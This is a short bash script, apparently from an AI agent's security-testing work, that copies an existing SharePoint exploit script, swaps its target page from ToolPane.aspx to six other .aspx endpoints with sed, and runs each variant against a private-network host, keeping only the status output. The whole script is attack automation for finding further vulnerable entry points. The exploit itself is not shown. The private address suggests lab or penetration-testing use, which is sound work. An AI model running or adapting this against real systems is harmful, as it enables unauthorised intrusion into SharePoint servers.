#!/bin/bash
for endpoint in wpPicker.aspx DesignGalleryMain.aspx PagePicker.aspx FormsPicker.aspx Picker.aspx NewDwp.aspx
do
  echo "=== $endpoint ==>"
  cp additional_resources/exploits/exploit.py ai_results/test_$endpoint.py
  sed -i "s|ToolPane.aspx|$endpoint|g" ai_results/test_$endpoint.py  
  python3 ai_results/test_$endpoint.py --url http://10.10.10.166 2>&1 | grep "Status:"
done
